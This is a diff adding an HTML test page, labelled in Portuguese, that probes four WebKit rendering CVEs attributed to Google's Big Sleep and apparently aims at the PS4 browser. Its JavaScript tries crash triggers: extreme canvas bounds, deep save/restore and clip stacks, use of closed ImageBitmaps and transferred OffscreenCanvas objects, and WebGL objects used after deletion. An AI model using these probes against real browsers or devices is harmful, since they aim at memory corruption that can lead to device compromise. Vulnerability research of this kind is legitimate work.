@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Big Sleep Cluster — CVE-2025-43429/43430/43431/43433</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030206;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#00aacc;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.src{background:#000a0c;border:2px solid #004455;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#339aaa;line-height:1.8}
+.src strong{color:#00ccdd;display:block;margin-bottom:4px}
+#log{background:#060608;border:1px solid #0a1518;border-radius:5px;padding:10px;min-height:200px;white-space:pre;overflow-y:auto;max-height:420px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.w{color:#ffaa00}.e{color:#ff4444}.i{color:#00aacc}.sep{color:#333}
+.btn{display:inline-block;margin-top:10px;margin-right:5px;padding:7px 13px;background:#000a0c;border:1px solid #003344;border-radius:4px;color:#007788;cursor:pointer;font:11px 'Courier New',monospace}
+.btn:hover{border-color:#00aacc;color:#00ccdd}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+</style>
+</head>
+<body>
+<h1>🤖 Google Big Sleep Cluster — 4 CVEs em 1 sessão AI</h1>
+<p class="meta">CVE-2025-43429 (BZ#298232) · CVE-2025-43430 (BZ#298196) · CVE-2025-43431 (BZ#298194) · CVE-2025-43433 (BZ#298093)</p>
+<div class="src">
+<strong>📋 BIG SLEEP AI CLUSTER — Nov/2025</strong>
+Google Big Sleep descobriu 4 bugs simultâneos em WebKit analisando commits com LLM.<br>
+Padrão do cluster: todos em WebKit rendering path, todos fixados em 2.50.2<br>
+<br>
+CVE-2025-43429 (BZ#298232): Buffer overflow — "improved bounds checking"<br>
+CVE-2025-43430 (BZ#298196): State management — "improved state management"<br>
+CVE-2025-43431 (BZ#298194): Memory corruption — "improved memory handling"<br>
+CVE-2025-43433 (BZ#298093): UAF — "improved memory management"<br>
+<br>
+ANÁLISE AI: Big Sleep foca em state acumulado invalidado por operações paralelas.<br>
+Padrão: Canvas 2D operations · WebGL state · Image rendering pipeline · OffscreenCanvas<br>
+Todos os bugs são em componentes de rendering — NÃO JSC, NÃO JIT.<br>
+PS4: branch Set/2023 = 26 meses anterior. Canvas/WebGL disponível sem JIT.
+</div>
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn" onclick="t1()">① Canvas Buffer Overflow (BZ#298232)</button>
+  <button class="btn" onclick="t2()">② State Mgmt Canvas (BZ#298196)</button>
+  <button class="btn" onclick="t3()">③ Image Corruption (BZ#298194)</button>
+  <button class="btn" onclick="t4()">④ OffscreenCanvas UAF (BZ#298093)</button>
+  <button class="btn" onclick="t5()">⑤ Canvas Clip Path Stress</button>
+  <button class="btn" onclick="t6()">⑥ WebGL State Corruption</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+<script>
+var L=document.getElementById('log');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('─── '+t+' ───','sep')}
+function gc(){try{var a=[];for(var i=0;i<10;i++)a.push(new ArrayBuffer(1024*1024));a=null}catch(e){}}
+
+function t1(){
+  sep('Canvas Buffer Overflow — BZ#298232 (CVE-2025-43429)');
+  l('Buffer overflow em Canvas com bounds extremos...','w');
+  try {
+    var canvas=document.createElement('canvas');
+    canvas.width=4096; canvas.height=4096;
+    document.body.appendChild(canvas);
+    var ctx=canvas.getContext('2d');
+    // Operações com coordenadas extremas e transformações
+    var tests=[
+      function(){ ctx.drawImage(canvas,-2147483647,-2147483647,4294967294,4294967294); },
+      function(){ ctx.fillRect(-1e15,-1e15,2e15,2e15); },
+      function(){
+        ctx.save();
+        ctx.scale(1e-10,1e-10);
+        ctx.fillRect(0,0,1e20,1e20);
+        ctx.restore();
+      },
+      function(){
+        var grad=ctx.createLinearGradient(-1e15,-1e15,1e15,1e15);
+        grad.addColorStop(0,'red'); grad.addColorStop(1,'blue');
+        ctx.fillStyle=grad;
+        ctx.fillRect(0,0,4096,4096);
+      },
+      function(){
+        // drawImage com source rect extremo
+        ctx.drawImage(canvas, -100, -100, 4300, 4300, 0, 0, 4096, 4096);
+      },
+    ];
+    tests.forEach(function(fn, i){
+      try { fn(); l('Canvas bounds test '+i+': OK','ok'); }
+      catch(e2){ l('Canvas bounds test '+i+': '+e2.name,'w'); }
+    });
+    // getImageData com região extrema
+    try {
+      var id=ctx.getImageData(-100,-100,4200,4200);
+      l('getImageData overflow region: '+id.data.length+' bytes','w');
+    } catch(e2){ l('getImageData overflow: '+e2.name+' (esperado)','ok'); }
+    document.body.removeChild(canvas);
+  } catch(e){ l('CRASH canvas buffer: '+e.name,'e'); }
+}
+
+function t2(){
+  sep('State Management Canvas — BZ#298196 (CVE-2025-43430)');
+  l('Canvas 2D state stack com transformações corrompidas...','w');
+  try {
+    var canvas=document.createElement('canvas');
+    canvas.width=800; canvas.height=600;
+    document.body.appendChild(canvas);
+    var ctx=canvas.getContext('2d');
+    // State stack profundo com valores de transformação extremos
+    for(var depth=0;depth<50;depth++){
+      ctx.save();
+      ctx.setTransform(
+        Math.cos(depth), Math.sin(depth),
+        -Math.sin(depth), Math.cos(depth),
+        depth*100, depth*100
+      );
+      ctx.clip(); // clipping path dentro de cada save
+    }
+    // Agora faz drawImage dentro de estado transformado profundo
+    ctx.drawImage(canvas,0,0);
+    // Restore além do limite
+    for(var r=0;r<60;r++) ctx.restore();
+    // Verifica que o canvas ainda responde
+    ctx.fillStyle='red';
+    ctx.fillRect(0,0,100,100);
+    var imageData=ctx.getImageData(0,0,10,10);
+    l('Canvas state mgmt: pixel[0]='+imageData.data[0]+' (deve ser 255)','ok');
+    document.body.removeChild(canvas);
+  } catch(e){ l('CRASH canvas state: '+e.name,'e'); }
+}
+
+function t3(){
+  sep('Image Rendering Corruption — BZ#298194 (CVE-2025-43431)');
+  l('Renderização de imagens com operações de decode simultâneas...','w');
+  try {
+    var canvas=document.createElement('canvas');
+    canvas.width=512; canvas.height=512;
+    document.body.appendChild(canvas);
+    var ctx=canvas.getContext('2d');
+    // Cria múltiplas imagens e desenha antes do decode completar
+    var images=[];
+    var drawn=0;
+    function tryDraw(){
+      drawn++;
+      if(drawn>=10){
+        document.body.removeChild(canvas);
+        l('Image rendering: '+drawn+' imagens sem crash','ok');
+      }
+    }
+    // SVG inline como data URL (decode imediato no WebKit)
+    for(var i=0;i<10;i++){
+      var img=new Image();
+      img.onload=function(){
+        try { ctx.drawImage(this,0,0,512,512); } catch(e2){}
+        tryDraw();
+      };
+      img.onerror=tryDraw;
+      // Varia o tamanho do SVG para diferentes code paths
+      img.src='data:image/svg+xml;base64,'+btoa(
+        '<svg xmlns="http://www.w3.org/2000/svg" width="'+(50+i*50)+'" height="'+(50+i*50)+'">'+
+        '<filter id="f'+i+'"><feGaussianBlur stdDeviation="'+(i+1)+'"/></filter>'+
+        '<rect width="100%" height="100%" fill="hsl('+i*36+',80%,50%)" filter="url(#f'+i+')"/>'+
+        '</svg>'
+      );
+      images.push(img);
+    }
+    l('10 imagens SVG com filtros iniciadas...','i');
+  } catch(e){ l('CRASH image: '+e.name,'e'); }
+}
+
+function t4(){
+  sep('OffscreenCanvas UAF — BZ#298093 (CVE-2025-43433)');
+  l('OffscreenCanvas com transferToImageBitmap e destroy...','w');
+  if(typeof OffscreenCanvas==='undefined'){
+    l('OffscreenCanvas NÃO disponível neste ambiente','w');
+    l('PS4 pode ter suporte limitado','i');
+    // Testa ImageBitmap como alternativa
+    try {
+      var canvas=document.createElement('canvas');
+      canvas.width=256; canvas.height=256;
+      var ctx=canvas.getContext('2d');
+      ctx.fillStyle='red'; ctx.fillRect(0,0,256,256);
+      createImageBitmap(canvas).then(function(bmp){
+        var c2=document.createElement('canvas');
+        c2.width=256; c2.height=256;
+        var ctx2=c2.getContext('2d');
+        ctx2.drawImage(bmp,0,0);
+        bmp.close(); // fecha o bitmap
+        // Tenta usar o bitmap fechado
+        try { ctx2.drawImage(bmp,0,0); l('drawImage de bitmap fechado: executou','w'); }
+        catch(e2){ l('drawImage de bitmap fechado: '+e2.name,'ok'); }
+        l('ImageBitmap alternativa: sem crash fatal','ok');
+      }).catch(function(e){ l('createImageBitmap: '+e.message,'w'); });
+    } catch(e2){ l('ImageBitmap fallback: '+e2.name,'w'); }
+    return;
+  }
+  try {
+    var osc=new OffscreenCanvas(512,512);
+    var octx=osc.getContext('2d');
+    // Desenha conteúdo
+    octx.fillStyle='linear-gradient(red,blue)';
+    octx.fillRect(0,0,512,512);
+    // Transfere para ImageBitmap
+    var bmp=osc.transferToImageBitmap();
+    l('transferToImageBitmap: OK','ok');
+    // OffscreenCanvas agora está "neutered" (transferido)
+    // Tenta usar o contexto após transfer
+    try {
+      octx.fillRect(0,0,10,10); // acesso após transfer
+      l('Acesso após transferToImageBitmap: executou (possível UAF)','w');
+    } catch(e2){ l('Acesso após transfer: '+e2.name+' (esperado)','ok'); }
+    bmp.close();
+    // Tenta criar outro OffscreenCanvas com o mesmo contexto
+    var osc2=new OffscreenCanvas(512,512);
+    var octx2=osc2.getContext('2d');
+    octx2.drawImage(osc,0,0); // osc está neutered
+    l('drawImage neutered OffscreenCanvas: executou','w');
+  } catch(e){ l('OffscreenCanvas: '+e.name+' — '+e.message,'e'); }
+}
+
+function t5(){
+  sep('Canvas Clip Path Stress');
+  l('Clip paths aninhados com formas complexas...','w');
+  try {
+    var canvas=document.createElement('canvas');
+    canvas.width=1024; canvas.height=1024;
+    document.body.appendChild(canvas);
+    var ctx=canvas.getContext('2d');
+    for(var i=0;i<30;i++){
+      ctx.save();
+      ctx.beginPath();
+      // Path complexo com bezier curves
+      ctx.moveTo(Math.random()*1024, Math.random()*1024);
+      for(var j=0;j<20;j++){
+        ctx.bezierCurveTo(
+          Math.random()*1024, Math.random()*1024,
+          Math.random()*1024, Math.random()*1024,
+          Math.random()*1024, Math.random()*1024
+        );
+      }
+      ctx.closePath();
+      ctx.clip('evenodd');
+      ctx.fillStyle='rgba('+Math.random()*255+',' +Math.random()*255+','+Math.random()*255+',0.3)';
+      ctx.fillRect(0,0,1024,1024);
+    }
+    for(var r=0;r<35;r++) ctx.restore();
+    ctx.fillStyle='green'; ctx.fillRect(0,0,50,50);
+    document.body.removeChild(canvas);
+    l('Clip path stress: sem crash','ok');
+  } catch(e){ l('CRASH clip: '+e.name,'e'); }
+}
+
+function t6(){
+  sep('WebGL State Corruption');
+  l('WebGL com operações de estado fora de sequência...','w');
+  var canvas=document.createElement('canvas');
+  canvas.width=512; canvas.height=512;
+  document.body.appendChild(canvas);
+  var gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');
+  if(!gl){ l('WebGL NÃO disponível','w'); document.body.removeChild(canvas); return; }
+  try {
+    var buf=gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER,buf);
+    gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([0,0,1,0,0,1]),gl.STATIC_DRAW);
+    // Deleta o buffer e ainda tenta usar
+    gl.deleteBuffer(buf);
+    try {
+      gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([1,1,0,1,1,0]),gl.STATIC_DRAW);
+      l('WebGL bufferData após deleteBuffer: executou','w');
+    } catch(e2){ l('WebGL bufferData após delete: '+e2.name,'ok'); }
+    // Cria shader mas não compila
+    var vs=gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(vs,'void main(){gl_Position=vec4(0,0,0,1);}');
+    // Deleta sem compilar
+    gl.deleteShader(vs);
+    // Tenta compilar shader deletado
+    try { gl.compileShader(vs); l('compileShader após delete: executou','w'); }
+    catch(e2){ l('compileShader após delete: '+e2.name,'ok'); }
+    // Verifica erros do WebGL
+    var err=gl.getError();
+    l('WebGL error state: 0x'+err.toString(16)+' (0=OK)','ok');
+    document.body.removeChild(canvas);
+  } catch(e){ l('CRASH WebGL: '+e.name,'e'); }
+}
+
+function runAll(){
+  L.innerHTML='';
+  l('▶ Google Big Sleep Cluster — 4 CVEs em 1 sessão AI','w');
+  l('Testando: Canvas bounds · State mgmt · Image · OffscreenCanvas · WebGL','i');
+  t1();
+  setTimeout(t2,600);setTimeout(t3,1200);setTimeout(t4,1800);
+  setTimeout(t5,2400);setTimeout(t6,3000);
+}
+</script>
+</body>
+</html>
